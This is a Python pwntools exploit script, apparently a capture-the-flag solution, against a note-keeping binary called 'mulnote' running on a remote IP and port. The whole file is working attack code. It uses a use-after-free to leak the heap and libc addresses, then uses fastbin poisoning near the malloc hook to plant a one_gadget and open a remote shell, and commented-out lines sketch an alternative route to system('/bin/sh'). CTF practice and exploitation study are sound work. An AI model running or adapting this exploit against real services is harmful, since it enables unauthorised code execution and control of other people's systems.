from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./mulnote')
else:
	p = remote('112.126.101.96', 9999)

def create(size, note):
	p.recvuntil('>')
	p.sendline('C')
	p.recvuntil('size')
	p.sendline(str(size))
	p.recvuntil('note')
	p.send(note)

def edit(index, note):
	p.recvuntil('>')
	p.sendline('E')
	p.recvuntil('index')
	p.sendline(str(index))
	p.recvuntil('note')
	p.send(note)

def remove(idx):
	p.recvuntil('>')
	p.sendline('R')
	p.recvuntil('index')
	p.sendline(str(idx))

def show():
	p.recvuntil('>')
	p.sendline('S')

create(0x20, 'A' * 0x19)
create(0x20, 'A' * 0x19)
create(0x20, 'A' * 0x19)
remove(0)
remove(1)
remove(2)
show()
for i in range(12):
	p.recvline()
heap_base = u64(p.recvline()[: 6].ljust(8, '\x00')) - 0x30
print hex(heap_base)

create(0x200, 'A\n')
remove(3)
show()
for i in range(14):
	p.recvline()
libc_base = u64(p.recvline()[: 6].ljust(8, '\x00')) - 0x3c4b78
print hex(libc_base)

create(0x60, p64(0x71) * 12)
create(0x60, p64(0x71) * 12)
create(0x60, p64(0x71) * 12)
remove(4)
remove(5)
remove(6)
edit(6, p64(libc_base + 0x3c4aed))
create(0x60, 'a\n')
one_gadget = libc_base + 0x4526a
realloc = libc_base + 0x846c0
system = libc_base + 0x45390
create(0x60, 'A' * 3 + p64(0) * 2 + p64(one_gadget) + '\n')
# create(0x60, 'A' * 3 + p64(0) * 9 + p64(0x71) + '\n')
# #gdb.attach(p)
# print hex(libc_base + 0x3c4aed)
# remove(4)	
# remove(6)
# edit(6, p64(libc_base + 0x3c4b40))
# create(0x60, '\bin\sh\x00\x00\n')
# create(0x60, p64(0) * 5 + p64(libc_base + 0x3c5c50) + '\n')
# for i in range(5):
# 	create(0x200, '\n')
# create(0x200, p64(0) * 31 + p64(system))
# create(0x30, '\\bin\sh\x00\n')
# #gdb.attach(p)
# remove(17)
# #gdb.attach(p)
p.interactive()
